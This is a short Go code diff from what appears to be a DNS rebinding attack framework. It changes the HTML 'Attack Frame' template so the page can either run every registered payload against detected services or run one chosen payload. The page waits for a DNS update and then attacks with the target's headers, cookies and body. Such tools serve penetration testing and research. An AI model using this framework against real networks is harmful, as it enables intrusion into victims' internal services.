@@ -464,17 +464,25 @@ func (pth *PayloadTemplateHandler) ServeHTTP(w http.ResponseWriter, r *http.Requ
 	log.Printf("HTTP: %v %v from %v", r.Method, r.RequestURI, r.RemoteAddr)
 
 	const tpl = `<!doctype html>
-	<html><head><title>TKTK</title><script src="payload.js"></script>
+	<html><head><title>Attack Frame</title><script src="payload.js"></script>
 	<script>
 	{{ .JavaScriptCode }}
-	function attack(headers, cookie, body) {
-	for (const p of Registry) {
-		if (p.isService() === true)
-		p.attack(headers, cookie, body);
-	};
+
+	function attack(payload, headers, cookie, body) {
+	const titleEl = document.getElementById('title');
+		if (payload === 'automatic') {
+			for (const payload in Registry) {
+				titleEl.innerText = payload;
+				if (Registry[payload].isService() === true)
+				Registry[payload].attack(headers, cookie, body);
+			};
+		} else {
+			titleEl.innerText = payload;
+			Registry[payload].attack(headers, cookie, body);
+		}
 	}
 	</script></head>
-	<body onload="begin('/')")><h3>TKTK</h3>
+	<body onload="begin('/')")><h3 id='title'>Rebinding...</h3>
 	<p><span id='hostname'></span>. <span id='rebindingstatus'>This page is waiting for a DNS update.</span></p>
 	</body></html>`
 
